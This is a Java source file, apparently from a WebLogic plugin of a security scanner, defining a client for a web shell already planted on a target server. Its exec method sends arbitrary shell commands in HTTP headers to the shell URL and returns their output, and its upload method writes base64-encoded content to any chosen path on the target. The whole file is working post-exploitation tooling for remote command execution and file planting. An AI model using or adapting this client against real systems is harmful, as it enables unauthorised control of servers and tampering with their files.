package com.gbw.scanner.plugins.scripts.weblogic;

import com.gbw.scanner.Host;
import com.gbw.scanner.http.GBWHttpClientBuilder;
import com.gbw.scanner.http.GBWHttpGetRequestBuilder;
import com.gbw.scanner.http.GBWHttpPostRequestBuilder;
import com.gbw.scanner.http.GBWHttpResponse;
import com.gbw.scanner.utils.Base64Utils;
import com.gbw.scanner.utils.HttpUtils;
import com.xmap.api.utils.TextUtils;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;


import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

public class GBWHttpShellClient {

    private static String getProto(Host host){

        String proto = host.getProto();

        if(TextUtils.isEmpty(proto)||proto.equals("t3")||proto.equals("iiop"))
            proto = "http";
        else if(proto.equals("t3s"))
            proto = "https";

        return proto;
    }

    public static String exec(Host host, String shellUrl, String cmd){

        Map<String,String> headers=new HashMap<String, String>();
        headers.put("type","exec");
        headers.put("cmd",cmd);

        CloseableHttpClient httpClient = null;
        HttpGet httpGet = null;
        GBWHttpResponse httpResponse = null;
        String proto = getProto(host);
        try {
            httpClient = GBWHttpClientBuilder.make(proto,host.getPort());
            httpGet = new GBWHttpGetRequestBuilder(proto,host.getIp(),host.getPort(),shellUrl)
                    .addHeaders(headers)
            .build();

            httpResponse = HttpUtils.send(httpClient,httpGet,true);

            if(httpResponse!=null)
                return httpResponse.getContent();
        }catch (Exception e){

        }finally {
            if(httpClient!=null) {
                try {
                    httpClient.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

        return "";
    }

    public static void upload(Host host,String shellUrl,String uploadPath,String text){
        Map<String,String> headers=new HashMap<String, String>();
        headers.put("type","upload");
        headers.put("path", uploadPath);
        String s=null;
        try {
            s= URLEncoder.encode(Base64Utils.encode(text.getBytes()),"utf-8");
        } catch (UnsupportedEncodingException e) {
            //e.printStackTrace();
        }

        headers.put("text", s);

        CloseableHttpClient httpClient = null;
        HttpPost httpPost = null;
        GBWHttpResponse httpResponse = null;
        String proto = getProto(host);

        try {
            httpClient = GBWHttpClientBuilder.make(proto,host.getPort());
            httpPost = new GBWHttpPostRequestBuilder(proto,host.getIp(),host.getPort(),shellUrl)
                    .addHeaders(headers)
                    .postString("a=b",false)
                    .build();

            HttpUtils.send(httpClient,httpPost);

        }catch (Exception e){

        }finally {
            if(httpClient!=null) {
                try {
                    httpClient.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

    }
}
